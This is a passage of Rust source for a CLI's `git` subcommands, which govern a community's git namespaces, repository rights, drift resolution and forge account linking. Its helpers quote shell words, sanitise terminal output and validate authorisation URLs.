//! `cnm git …` — the community's git namespaces (`git-ns/*`).
//!
//! Two kinds of command, and the difference is who is authorized:
//!
//! - **Changes** (`namespace bind|unbind`, `grant`, `revoke`, `adopt`, `view`,
//!   `link`) are signed `git-ns/*` Trust Tasks, signed with this community profile's
//!   key and authorized by *that DID's git rights* in the VTC's records. A
//!   community administrator's role binds namespaces and nothing more: to
//!   grant, this DID must hold a right that carries the authority.
//! - **Listings** (`namespace list`, `repos`, `view --admin`) are the
//!   administrator's REST reads and authenticate with an admin session, like
//!   `cnm vetting`.
//!
//! A refusal is reported by its specification code with the fix, where there
//! is one — `git-ns:lastOwner` names the grant that makes the revoke possible.

use clap::{Subcommand, ValueEnum};
use serde_json::{Value, json};
use vta_cli_common::duration::parse_duration_secs;
use vta_cli_common::render::{BOLD, DIM, RESET, bin_name, is_json_output, print_json};
use vtc_client::git_ns::{specs, task_error};
use vtc_client::{HolderKey, VtcClient, VtcError};

use crate::auth;
use crate::vtc::{self as vtc_target, VtcTarget};

type CliResult<T = ()> = Result<T, Box<dyn std::error::Error>>;

/// `cnm git …`
#[derive(Subcommand)]
pub enum GitCommands {
    /// Namespaces: bind this community to a forge owner, end it, list them.
    Namespace {
        #[command(subcommand)]
        command: NamespaceCommands,
    },
    /// List the repositories the community records (admin session).
    Repos {
        /// Only this namespace (its identifier, from `namespace list`).
        #[arg(long)]
        namespace: Option<String>,
    },
    /// Grant a git right, signed as this profile's DID.
    Grant {
        /// Who receives the right.
        #[arg(long)]
        subject: String,
        #[arg(long, value_enum)]
        right: RightArg,
        /// Forge-qualified and lowercase: `github.com/acme` or
        /// `github.com/acme/widgets`.
        #[arg(long)]
        resource: String,
        /// Lapse after this long (`90d`, `12h`).
        #[arg(long)]
        expires_in: Option<String>,
        /// Why — shown to the resource's owners and admins, never published.
        #[arg(long)]
        reason: Option<String>,
    },
    /// Revoke a recorded git right, signed as this profile's DID.
    Revoke {
        #[arg(long)]
        subject: String,
        #[arg(long, value_enum)]
        right: RightArg,
        #[arg(long)]
        resource: String,
        #[arg(long)]
        reason: Option<String>,
    },
    /// Create a repository in a namespace, becoming its owner (needs
    /// `git.repo.create`). Where no bot can create it, prints the steps.
    Create {
        /// The namespace identifier (`namespace list`).
        #[arg(long)]
        namespace: String,
        /// The repository name, lowercase.
        name: String,
        #[arg(long, value_enum, default_value_t = VisibilityArg::Public)]
        visibility: VisibilityArg,
        /// Shown by the forge; do not put anything here you would not publish.
        #[arg(long)]
        description: Option<String>,
    },
    /// Hand this profile's ownership of a repository to someone else.
    Transfer {
        /// `github.com/acme/widgets`.
        resource: String,
        /// Who receives ownership.
        #[arg(long)]
        to: String,
    },
    /// Archive a repository: the forge makes it read-only and every
    /// commit-signing right on it is revoked. No task reverses it.
    Archive {
        /// `github.com/acme/widgets`.
        resource: String,
    },
    /// Bring an existing repository under governance and name its owners.
    Adopt {
        /// `github.com/acme/widgets`.
        resource: String,
        /// An owner's DID. Repeat for several; at least one.
        #[arg(long = "owner", required = true)]
        owners: Vec<String>,
    },
    /// Answer drift the bridge reported on a repository (`git-ns/drift/resolve`).
    Drift {
        #[command(subcommand)]
        command: DriftCommands,
    },
    /// Restore an admin to a headless namespace — one whose every
    /// `git.ns.admin` left or lapsed. Community administrators only, and only
    /// while the namespace is headless.
    Reseat {
        /// The namespace identifier (`namespace list`).
        namespace: String,
        /// The current member who receives `git.ns.admin`.
        #[arg(long)]
        subject: String,
        /// Why the namespace is headless and why this member. Recorded as the
        /// right's reason and shown to the namespace's repository owners.
        #[arg(long)]
        statement: String,
    },
    /// What this profile's DID may see (`git-ns/view`), with its linked forge
    /// accounts, or with `--admin` every record and reason (admin session).
    View {
        #[arg(long)]
        resource: Option<String>,
        #[arg(long)]
        admin: bool,
    },
    /// Link your account on a forge to this profile's DID
    /// (`git-ns/account/link`), so the bridge can give it the forge roles
    /// this DID's rights call for. With `--list`, show the linked accounts.
    ///
    /// One account per forge: linking again replaces the one linked there.
    /// There is no unlink task; an account is unlinked when you leave.
    Link {
        /// The forge host: `github.com`, `codeberg.org`, a GHES or Forgejo
        /// host. It needs a bridge-mode namespace.
        #[arg(long, required_unless_present_any = ["list", "status"])]
        forge: Option<String>,
        /// List the forge accounts linked to this profile's DID.
        #[arg(long, conflicts_with_all = ["forge", "status", "no_wait"])]
        list: bool,
        /// Follow a link begun earlier, by the link id it printed.
        #[arg(long, value_name = "LINK_ID", conflicts_with = "forge")]
        status: Option<String>,
        /// Print where to authorise (or, with `--status`, where the link
        /// stands) and return, rather than waiting for the link to finish.
        #[arg(long)]
        no_wait: bool,
    },
}

#[derive(Subcommand)]
pub enum DriftCommands {
    /// Adopt a forge-side role as a right, or have the bridge revert a
    /// forge-side change. Read the item first with `git view --resource`.
    Resolve {
        /// `github.com/acme/widgets`.
        resource: String,
        #[arg(value_enum)]
        action: DriftAction,
        /// The item's type, as `git view` shows it.
        #[arg(long = "type", value_enum)]
        kind: DriftTypeArg,
        /// For a role item: the forge account's id (not its login).
        #[arg(long)]
        account_id: Option<String>,
        /// For a role item: the account's login, for display.
        #[arg(long)]
        account_login: Option<String>,
        /// The item's `observed` value as you read it. Required to adopt: it
        /// is refused if the forge now shows something else.
        #[arg(long)]
        observed: Option<String>,
        #[arg(long)]
        reason: Option<String>,
    },
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum DriftAction {
    Adopt,
    Revert,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum DriftTypeArg {
    #[value(name = "roleAdded")]
    RoleAdded,
    #[value(name = "roleRemoved")]
    RoleRemoved,
    #[value(name = "roleChanged")]
    RoleChanged,
    #[value(name = "requiredCheckMissing")]
    RequiredCheckMissing,
    #[value(name = "protectionWeakened")]
    ProtectionWeakened,
    #[value(name = "bootstrapMissing")]
    BootstrapMissing,
}

impl DriftTypeArg {
    fn as_str(self) -> &'static str {
        match self {
            DriftTypeArg::RoleAdded => "roleAdded",
            DriftTypeArg::RoleRemoved => "roleRemoved",
            DriftTypeArg::RoleChanged => "roleChanged",
            DriftTypeArg::RequiredCheckMissing => "requiredCheckMissing",
            DriftTypeArg::ProtectionWeakened => "protectionWeakened",
            DriftTypeArg::BootstrapMissing => "bootstrapMissing",
        }
    }

    fn is_role(self) -> bool {
        matches!(
            self,
            DriftTypeArg::RoleAdded | DriftTypeArg::RoleRemoved | DriftTypeArg::RoleChanged
        )
    }
}

/// The `git-ns/drift/resolve` payload for these arguments. The account's
/// forge is the repository's; `login` is display only and defaults to the id.
fn drift_payload(
    resource: &str,
    action: DriftAction,
    kind: DriftTypeArg,
    account_id: Option<String>,
    account_login: Option<String>,
    observed: Option<String>,
    reason: Option<String>,
) -> CliResult<Value> {
    let resource = resource.to_lowercase();
    let mut drift = json!({ "type": kind.as_str() });
    match (kind.is_role(), account_id) {
        (true, Some(id)) => {
            let forge = resource.split('/').next().unwrap_or_default().to_string();
            let login = account_login.unwrap_or_else(|| id.clone());
            drift["account"] = json!({ "forge": forge, "id": id, "login": login });
        }
        (true, None) => {
            return Err(format!(
                "a `{}` item is selected by its account: pass --account-id",
                kind.as_str()
            )
            .into());
        }
        (false, Some(_)) => {
            return Err(format!("a `{}` item has no account", kind.as_str()).into());
        }
        (false, None) => {}
    }
    let action = match action {
        DriftAction::Adopt => "adopt",
        DriftAction::Revert => "revert",
    };
    if let Some(o) = observed {
        drift["observed"] = json!(o);
    } else if action == "adopt" {
        return Err(
            "adopting records a right derived from the observed role: pass --observed \
                    with the value `git view` showed"
                .into(),
        );
    }
    let mut payload = json!({ "resource": resource, "drift": drift, "action": action });
    if let Some(r) = reason {
        payload["reason"] = json!(r);
    }
    Ok(payload)
}

#[derive(Subcommand)]
pub enum NamespaceCommands {
    /// Bind the community to one owner on one forge. Everything granted in it
    /// is published to the community's Trust Registry, where anyone can read
    /// who owns and who may commit to each repository.
    Bind {
        /// The forge host: `github.com`, `codeberg.org`, a GHES or Forgejo host.
        #[arg(long)]
        forge: String,
        /// The organisation or account, lowercase.
        #[arg(long)]
        owner: String,
        #[arg(long, value_enum, default_value_t = ModeArg::Manual)]
        mode: ModeArg,
    },
    /// End the community's governance of a namespace: every right in it is
    /// revoked and withdrawn from the registry.
    Unbind {
        /// The namespace identifier (`namespace list`).
        namespace: String,
    },
    /// List bound and pending namespaces (admin session).
    List,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum VisibilityArg {
    Public,
    Private,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum ModeArg {
    Bridge,
    Manual,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum RightArg {
    #[value(name = "git.ns.admin")]
    NsAdmin,
    #[value(name = "git.repo.create")]
    RepoCreate,
    #[value(name = "git.repo.own")]
    RepoOwn,
    #[value(name = "git.repo.maintain")]
    RepoMaintain,
    #[value(name = "git.commit.sign")]
    CommitSign,
}

impl RightArg {
    fn as_str(self) -> &'static str {
        match self {
            RightArg::NsAdmin => "git.ns.admin",
            RightArg::RepoCreate => "git.repo.create",
            RightArg::RepoOwn => "git.repo.own",
            RightArg::RepoMaintain => "git.repo.maintain",
            RightArg::CommitSign => "git.commit.sign",
        }
    }
}

/// This profile's key, as the signer of `git-ns/*` documents.
fn signing_key(keyring_key: &str) -> CliResult<(String, HolderKey)> {
    let session = auth::loaded_session(keyring_key).ok_or_else(|| {
        format!(
            "no stored identity for this community profile. Run `{} setup` first.",
            bin_name()
        )
    })?;
    let key = HolderKey::from_did_key(&session.client_did, &session.private_key_multibase)
        .map_err(|e| format!("this profile's key cannot sign: {e}"))?;
    Ok((session.client_did, key))
}

/// The fix for a refusal, where the operator's intent maps onto another
/// command.
/// A DID argument, checked as DID-core has it before anything is signed:
/// what the VTC would refuse, and what could not be pasted safely, is caught
/// here with the reason.
fn did_arg(label: &str, value: &str) -> CliResult<String> {
    vta_sdk::identifier::validate_did_core(label, value)?;
    Ok(value.to_string())
}

/// `s` as one shell word that sh, bash, zsh and fish all read back as `s`:
/// unchanged when it holds nothing a shell interprets and does not start with
/// `-` (an option), `=` (zsh's `=cmd` expansion) or `%` (fish's `%self`);
/// otherwise quoted. Every value this module puts into a command it prints
/// goes through here, so a printed command can be pasted as it stands.
///
/// POSIX's `'…'\''…'` is not enough: fish reads `\'` and `\\` as escapes
/// even inside single quotes. So runs without `'` or `\` are single-quoted
/// (nothing else is special there in any of these shells), and each `'` is
/// written `"'"` and each `\` `"\\"`, which mean the same one character in
/// double quotes in POSIX shells and in fish.
fn shell_word(s: &str) -> String {
    let plain = !s.is_empty()
        && !s.starts_with(['-', '=', '%'])
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'%' | b'+' | b'=' | b','
                )
        });
    if plain {
        return s.to_string();
    }
    if s.is_empty() {
        return "''".to_string();
    }
    let mut out = String::with_capacity(s.len() + 2);
    let mut run = String::new();
    let flush = |run: &mut String, out: &mut String| {
        if !run.is_empty() {
            out.push('\'');
            out.push_str(run);
            out.push('\'');
            run.clear();
        }
    };
    for c in s.chars() {
        match c {
            '\'' => {
                flush(&mut run, &mut out);
                out.push_str("\"'\"");
            }
            '\\' => {
                flush(&mut run, &mut out);
                out.push_str("\"\\\\\"");
            }
            c => run.push(c),
        }
    }
    flush(&mut run, &mut out);
    out
}

/// Text from elsewhere (the VTC's refusal message, a DID, what a bridge
/// returned) made safe to print to a terminal: control characters, escapes
/// included, and format characters are shown as `?`.
///
/// Format characters (Unicode category Cf) print as nothing, yet the bidi
/// ones among them — U+202A–202E, U+2066–2069 — reorder what follows, and
/// the zero-width ones hide in plain sight, so a hostile value could make an
/// authorisation URL read as another. Nothing here needs one.
fn terminal_safe(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_control() || is_format_char(c) {
                '?'
            } else {
                c
            }
        })
        .collect()
}

/// Unicode general category Cf (Format), as of Unicode 16. `std` has no
/// category lookup; the set is small and changes rarely.
fn is_format_char(c: char) -> bool {
    matches!(
        u32::from(c),
        0x00AD
            | 0x0600..=0x0605
            | 0x061C
            | 0x06DD
            | 0x070F
            | 0x0890..=0x0891
            | 0x08E2
            | 0x180E
            | 0x200B..=0x200F
            | 0x202A..=0x202E
            | 0x2060..=0x2064
            | 0x2066..=0x206F
            | 0xFEFF
            | 0xFFF9..=0xFFFB
            | 0x110BD
            | 0x110CD
            | 0x13430..=0x1343F
            | 0x1BCA0..=0x1BCA3
            | 0x1D173..=0x1D17A
            | 0xE0001
            | 0xE0020..=0xE007F
    )
}

fn guidance(code: &str, message: &str, did: &str) -> String {
    let bin = shell_word(bin_name());
    let (code, message, did) = (
        terminal_safe(code),
        terminal_safe(message),
        terminal_safe(did),
    );
    let hint = match code.as_str() {
        "git-ns:lastOwner" => format!(
            "\nA repository always keeps an owner. Name another first:\n  {bin} git grant \
             --subject <did> --right git.repo.own --resource <repository>\nthen revoke this one."
        ),
        "git-ns:lastAdmin" => format!(
            "\nA namespace always keeps an admin. Grant another first:\n  {bin} git grant \
             --subject <did> --right git.ns.admin --resource <namespace>"
        ),
        "permissionDenied" if message.contains("for members of this community") => {
            format!("\nOnly a current member links a forge account, and {did} is not one here.")
        }
        "permissionDenied" if message.contains("elevated_requires_admin") => format!(
            "\nUnder the default `[git_ns] elevated_requires_admin`, an owner cannot transfer, \
             resign ownership, archive or name a co-owner without a community administrator: \
             this VTC has no step-up it can ask a member for yet. Ask a community \
             administrator to run it, e.g.:\n  {bin} git grant --subject <did> --right \
             git.repo.own --resource <repository>"
        ),
        "git-ns:escalation" | "permissionDenied" => format!(
            "\nThese commands are authorized by {did}'s own git rights, not by an admin \
             session. See what it holds:\n  {bin} git view"
        ),
        "git-ns:namespaceNotBound" => "\nThe namespace's binding has not completed: finish \
             the step at the URL `namespace bind` printed, then retry."
            .to_string(),
        "git-ns/namespace/bind:alreadyBound" => {
            format!("\nIt is already bound, or binding. See:\n  {bin} git namespace list")
        }
        "git-ns/namespace/bind:noBridge" => "\nNo bridge serves that forge. Bind with \
             `--mode manual`, or configure `[git_ns.bridges]` on the VTC."
            .to_string(),
        "git-ns:unknownRepo" => format!(
            "\nThe VTC records no repository there. Bring it under governance first:\n  {bin} \
             git adopt <resource> --owner <did>"
        ),
        "git-ns/repo/transfer:notOwner" => format!(
            "\nA transfer hands over your own ownership record. A namespace admin names an \
             owner instead:\n  {bin} git grant --subject <did> --right git.repo.own --resource \
             <repository>"
        ),
        "git-ns/repo/create:nameTaken" => format!(
            "\nThe community already records a repository there. See it:\n  {bin} git view \
             --resource <resource>"
        ),
        "git-ns/right/revoke:notGranted" => "\nNothing to revoke: no live record matches. \
             Implied rights (an owner's commit right, an admin's ownership) are not records."
            .to_string(),
        "git-ns/drift/resolve:driftNotFound" => format!(
            "\nNo outstanding item matches — resolved already, or the forge changed since you \
             read it. Read it again:\n  {bin} git view --resource <repository>"
        ),
        // A forge-side lowering is accepted by revoking, not adopting.
        "git-ns/drift/resolve:notAdoptable" if message.contains("no higher") => format!(
            "\nThe forge shows a lower role than the member holds. To accept the lowering, \
             revoke the right:\n  {bin} git revoke --subject <did> --right <right> --resource \
             <repository>\nor revert the item to restore the projected role."
        ),
        "git-ns/drift/resolve:notAdoptable"
        | "git-ns/drift/resolve:accountNotLinked"
        | "git-ns/drift/resolve:noMatchingRight" => format!(
            "\nThis item records no right. Revert it instead:\n  {bin} git drift resolve \
             <repository> revert --type <type> [--account-id <id>]"
        ),
        "git-ns/drift/resolve:notRevertible" if message.contains("manual mode") => {
            "\nThe namespace is governed in manual mode: no bridge can change the forge. Undo \
             the change on the forge yourself."
                .to_string()
        }
        "git-ns/drift/resolve:notRevertible" if message.contains("projection") => format!(
            "\nThe account is a member's, and the projection gives it a role here: reverting \
             would not remove it. Adopt the forge-side role, or revoke the member's right:\n  \
             {bin} git revoke --subject <did> --right <right> --resource <repository>"
        ),
        "git-ns/drift/resolve:notRevertible" => "\nThe bridge cannot undo this change: one \
             that implements only git-ns/bridge/job 0.1 cannot take a role it does not manage \
             off a repository. Remove it on the forge, or upgrade the bridge."
            .to_string(),
        "git-ns/account/link:unsupportedForge" => format!(
            "\nA link is completed by a bridge, so it needs a bridge-mode namespace on that \
             forge; a manual-mode namespace gives nobody a forge role. A community \
             administrator can see what is bound:\n  {bin} git namespace list"
        ),
        "git-ns/account/link-status:unknownLink" => format!(
            "\nA link is answered only to the member who began it, and forgotten some days \
             after it finishes. Start again:\n  {bin} git link --forge <forge>"
        ),
        "git-ns/namespace/reseat:notHeadless" => format!(
            "\nThe namespace still has an admin; its admins grant git.ns.admin:\n  {bin} git \
             grant --subject <did> --right git.ns.admin --resource <namespace>"
        ),
        _ => String::new(),
    };
    format!("the community refused it ({code}): {message}{hint}")
}

fn explain(err: VtcError, did: &str) -> Box<dyn std::error::Error> {
    match task_error(&err) {
        Some((code, message)) => guidance(&code, &message, did).into(),
        None => err.to_string().into(),
    }
}

fn show<T: serde::Serialize>(value: &T) -> CliResult {
    if is_json_output() {
        print_json(value)?;
    } else {
        println!("{}", serde_json::to_string_pretty(value)?);
    }
    Ok(())
}

/// What binding a namespace makes public.
fn bind_notice(forge: &str, owner: &str) -> String {
    format!(
        "Rights granted in {forge}/{owner} will be published to the community's Trust \
         Registry: anyone can read who owns and who may commit to each repository."
    )
}

/// Write `notice`, and only then send. The specification requires the public
/// consequence of a bind be stated before the namespace is bound
/// (`git-ns/namespace/bind`, *Request*), and a manual-mode bind is bound by the
/// very request — so the notice cannot follow the response.
async fn announce_then<T>(
    out: &mut impl std::io::Write,
    notice: &str,
    send: impl std::future::Future<Output = T>,
) -> T {
    let _ = writeln!(out, "{DIM}{notice}{RESET}");
    send.await
}

/// How often `git link` asks where a link stands. `git-ns/account/link-status`:
/// a client SHOULD poll no faster than every five seconds.
const LINK_POLL: std::time::Duration = std::time::Duration::from_secs(5);

/// How long past its `expiresAt` a pending link is still polled: the VTC
/// marks it expired on the first poll after that, so this only bounds a VTC
/// that never answers with a final state.
const LINK_GRACE: chrono::Duration = chrono::Duration::seconds(30);

/// A string member of a response, safe to print.
fn field(v: &Value, pointer: &str) -> String {
    terminal_safe(
        v.pointer(pointer)
            .and_then(Value::as_str)
            .unwrap_or_default(),
    )
}

/// The `url` of a `git-ns/account/link` response, parsed and held to what
/// the specification allows (`^https://`) before anything is printed. What
/// is printed is the parsed form: its host is IDNA-encoded and its path and
/// query percent-encoded, so no character in it can disguise it.
fn authorisation_url(v: &Value) -> Result<url::Url, String> {
    let raw = v.get("url").and_then(Value::as_str).unwrap_or_default();
    let refused = |why: &str| {
        format!(
            "the community returned an authorisation URL this client will not show ({why}): {}",
            terminal_safe(raw)
        )
    };
    let url = url::Url::parse(raw).map_err(|e| refused(&e.to_string()))?;
    if url.scheme() != "https" {
        return Err(refused("not https"));
    }
    if url.host_str().is_none_or(str::is_empty) {
        return Err(refused("no host"));
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err(refused("it carries credentials"));
    }
    Ok(url)
}

/// What the member does next, from a `git-ns/account/link` response. The
/// device code is shown to the member and nowhere else (the specification's
/// *Data carried*): it is never logged.
fn link_instructions(forge: &str, v: &Value) -> Result<String, String> {
    let url = authorisation_url(v)?;
    let bin = shell_word(bin_name());
    let link_id = v.get("linkId").and_then(Value::as_str).unwrap_or_default();
    let mut out = format!(
        "Authorise the link on {}:\n  {}\n",
        terminal_safe(forge),
        terminal_safe(url.as_str())
    );
    if v.get("userCode").and_then(Value::as_str).is_some() {
        out.push_str(&format!(
            "and enter the code {BOLD}{}{RESET}\n",
            field(v, "/userCode")
        ));
    }
    out.push_str(&format!(
        "{DIM}The link lapses at {}. Follow it later with:\n  {bin} git link --status {}{RESET}",
        field(v, "/expiresAt"),
        shell_word(&terminal_safe(link_id))
    ));
    Ok(out)
}

/// How a link ended, as far as this command saw it.
#[derive(Debug, PartialEq, Eq)]
enum LinkEnd {
    /// Linked: the line to print.
    Linked(String),
    /// Not linked, and no longer worth waiting for (expired, failed, a state
    /// this client does not know), or still pending when this command
    /// stopped waiting: why, for the error.
    NotLinked(String),
}

/// A `git-ns/account/link-status` answer as a [`LinkEnd`]. A `pending`
/// answer is only ever the last one when waiting stopped (`--no-wait`, or
/// the deadline passed), so it is not a success.
fn link_end(v: &Value, did: &str, link_id: &str) -> LinkEnd {
    let bin = shell_word(bin_name());
    let did = terminal_safe(did);
    match v.get("state").and_then(Value::as_str) {
        Some("linked") => LinkEnd::Linked(format!(
            "Linked {} account {BOLD}{}{RESET} (id {}) to {did}.",
            field(v, "/account/forge"),
            field(v, "/account/login"),
            field(v, "/account/id"),
        )),
        Some("pending") => LinkEnd::NotLinked(format!(
            "the link is still pending: it has not been authorised on the forge yet. Follow \
             it with:\n  {bin} git link --status {}",
            shell_word(&terminal_safe(link_id))
        )),
        Some("expired") => LinkEnd::NotLinked(format!(
            "the link lapsed before it was authorised. Start again:\n  {bin} git link --forge \
             <forge>"
        )),
        Some("failed") => LinkEnd::NotLinked(format!(
            "the link failed: the forge refused it (the authorisation was declined, or the \
             bridge could not complete it), or the account is already linked to another \
             member. See what is linked to {did}:\n  {bin} git link --list\nand start again \
             with:\n  {bin} git link --forge <forge>"
        )),
        other => LinkEnd::NotLinked(format!(
            "the community answered a link state this client does not know: {}",
            terminal_safe(other.unwrap_or("(none)"))
        )),
    }
}

/// Report the last link-status answer: as JSON on `out` in JSON mode, as a
/// line otherwise. Either way, anything but `linked` is an error, so the
/// exit status says the same thing in both modes.
fn finish_link(
    out: &mut impl std::io::Write,
    json_mode: bool,
    v: &Value,
    did: &str,
    link_id: &str,
) -> CliResult {
    let end = link_end(v, did, link_id);
    if json_mode {
        writeln!(out, "{}", serde_json::to_string_pretty(v)?)?;
    }
    match end {
        LinkEnd::Linked(line) => {
            if !json_mode {
                writeln!(out, "{line}")?;
            }
            Ok(())
        }
        LinkEnd::NotLinked(why) => Err(why.into()),
    }
}

/// `git-ns/view/0.2`'s `accounts`, one line each.
fn account_lines(accounts: &Value) -> Vec<String> {
    accounts
        .as_array()
        .into_iter()
        .flatten()
        .map(|a| {
            format!(
                "{BOLD}{}{RESET}  {}  id {}  {DIM}linked {}{RESET}",
                field(a, "/account/forge"),
                field(a, "/account/login"),
                field(a, "/account/id"),
                field(a, "/linkedAt"),
            )
        })
        .collect()
}

/// Ask `poll` until it answers a state other than `pending`, or `deadline`
/// plus [`LINK_GRACE`] has passed by `now`, sleeping with `sleep` between
/// asks. Returns the last answer. Without a deadline it asks until a final
/// state: the VTC marks a lapsed link expired on the next ask.
async fn follow<P, PF, S, SF>(
    mut poll: P,
    deadline: Option<chrono::DateTime<chrono::Utc>>,
    now: impl Fn() -> chrono::DateTime<chrono::Utc>,
    mut sleep: S,
) -> CliResult<Value>
where
    P: FnMut() -> PF,
    PF: std::future::Future<Output = CliResult<Value>>,
    S: FnMut() -> SF,
    SF: std::future::Future<Output = ()>,
{
    loop {
        let v = poll().await?;
        if v.get("state").and_then(Value::as_str) != Some("pending") {
            return Ok(v);
        }
        if deadline.is_some_and(|d| now() > d + LINK_GRACE) {
            return Ok(v);
        }
        sleep().await;
    }
}

/// [`follow`] against the VTC, every [`LINK_POLL`]. `link_id` is sent as the
/// VTC returned it; it is sanitised only where it is shown.
async fn follow_link(
    client: &VtcClient,
    key: &HolderKey,
    did: &str,
    link_id: &str,
    deadline: Option<chrono::DateTime<chrono::Utc>>,
) -> CliResult<Value> {
    follow(
        || async {
            Ok(serde_json::to_value(
                client
                    .git_ns_link_status(link_id, key)
                    .await
                    .map_err(|e| explain(e, did))?,
            )?)
        },
        deadline,
        chrono::Utc::now,
        || tokio::time::sleep(LINK_POLL),
    )
    .await
}

pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) -> CliResult {
    // Signed commands need no session; listings do.
    let anon = || VtcClient::anonymous(&target.base, &target.did);
    match command {
        GitCommands::Namespace { command } => match command {
            NamespaceCommands::Bind { forge, owner, mode } => {
                let (did, key) = signing_key(keyring_key)?;
                let mode = match mode {
                    ModeArg::Bridge => "bridge",
                    ModeArg::Manual => "manual",
                };
                let (forge, owner) = (forge.to_lowercase(), owner.to_lowercase());
                let client = anon();
                let resp = announce_then(
                    &mut std::io::stderr(),
                    &bind_notice(&forge, &owner),
                    client.git_ns_bind(&forge, &owner, mode, &key),
                )
                .await
                .map_err(|e| explain(e, &did))?;
                let v = serde_json::to_value(&resp)?;
                if is_json_output() {
                    return Ok(print_json(&v)?);
                }
                println!(
                    "{BOLD}{}/{}{RESET} — {} ({})",
                    v["namespace"]["forge"].as_str().unwrap_or_default(),
                    v["namespace"]["owner"].as_str().unwrap_or_default(),
                    v["namespace"]["state"].as_str().unwrap_or_default(),
                    v["namespace"]["id"].as_str().unwrap_or_default(),
                );
                if let Some(url) = v.pointer("/next/url").and_then(Value::as_str) {
                    println!("Prove control of the owner on the forge to finish binding:\n  {url}");
                }
                Ok(())
            }
            NamespaceCommands::Unbind { namespace } => {
                let (did, key) = signing_key(keyring_key)?;
                let resp = anon()
                    .git_ns_unbind(&namespace, &key)
                    .await
                    .map_err(|e| explain(e, &did))?;
                show(&resp)
            }
            NamespaceCommands::List => {
                let vtc = vtc_target::connect(keyring_key, target).await?;
                let v = vtc.client.git_ns_namespaces().await?;
                if is_json_output() {
                    return Ok(print_json(&v)?);
                }
                for ns in v["namespaces"].as_array().into_iter().flatten() {
                    println!(
                        "{BOLD}{}{RESET}  {}  {} {}  admins: {}  repos: {}",
                        ns["resource"].as_str().unwrap_or_default(),
                        ns["id"].as_str().unwrap_or_default(),
                        ns["mode"].as_str().unwrap_or_default(),
                        ns["state"].as_str().unwrap_or_default(),
                        ns["admins"].as_array().map_or(0, Vec::len),
                        ns["repoCount"],
                    );
                }
                Ok(())
            }
        },
        GitCommands::Repos { namespace } => {
            let vtc = vtc_target::connect(keyring_key, target).await?;
            let v = vtc.client.git_ns_repos(namespace.as_deref()).await?;
            if is_json_output() {
                return Ok(print_json(&v)?);
            }
            for r in v["repos"].as_array().into_iter().flatten() {
                println!(
                    "{BOLD}{}{RESET}  {}  owners: {}  sync: {}",
                    r["resource"].as_str().unwrap_or_default(),
                    r["state"].as_str().unwrap_or_default(),
                    r["owners"].as_array().map_or(0, Vec::len),
                    r["syncState"].as_str().unwrap_or_default(),
                );
            }
            Ok(())
        }
        GitCommands::Grant {
            subject,
            right,
            resource,
            expires_in,
            reason,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "subject": subject,
                "right": right.as_str(),
                "resource": resource.to_lowercase(),
            });
            if let Some(d) = expires_in {
                let secs = parse_duration_secs(&d)?;
                let at = chrono::Utc::now() + chrono::Duration::seconds(secs as i64);
                payload["expiresAt"] = json!(at.to_rfc3339_opts(chrono::SecondsFormat::Secs, true));
            }
            if let Some(r) = reason {
                payload["reason"] = json!(r);
            }
            let payload: specs::right::grant::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that grant is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_grant(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Revoke {
            subject,
            right,
            resource,
            reason,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "subject": subject,
                "right": right.as_str(),
                "resource": resource.to_lowercase(),
            });
            if let Some(r) = reason {
                payload["reason"] = json!(r);
            }
            let payload: specs::right::revoke::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that revocation is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_revoke(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Create {
            namespace,
            name,
            visibility,
            description,
        } => {
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "namespace": namespace,
                "name": name.to_lowercase(),
                "visibility": match visibility {
                    VisibilityArg::Public => "public",
                    VisibilityArg::Private => "private",
                },
            });
            if let Some(d) = description {
                payload["description"] = json!(d);
            }
            let payload: specs::repo::create::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that repository is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_create_repo(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            let v = serde_json::to_value(&resp)?;
            if is_json_output() {
                return Ok(print_json(&v)?);
            }
            println!(
                "{BOLD}{}{RESET} — {}",
                v["repo"]["resource"].as_str().unwrap_or_default(),
                v["repo"]["state"].as_str().unwrap_or_default()
            );
            for (i, step) in v["manualSteps"]
                .as_array()
                .into_iter()
                .flatten()
                .enumerate()
            {
                println!("  {}. {}", i + 1, step.as_str().unwrap_or_default());
            }
            Ok(())
        }
        GitCommands::Transfer { resource, to } => {
            let to = did_arg("--to", &to)?;
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_transfer(&resource.to_lowercase(), &to, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Archive { resource } => {
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_archive(&resource.to_lowercase(), &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Adopt { resource, owners } => {
            for o in &owners {
                did_arg("--owner", o)?;
            }
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_adopt(&resource.to_lowercase(), &owners, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::View { resource, admin } => {
            if admin {
                let vtc = vtc_target::connect(keyring_key, target).await?;
                let v = vtc.client.git_ns_admin_view(resource.as_deref()).await?;
                return show(&v);
            }
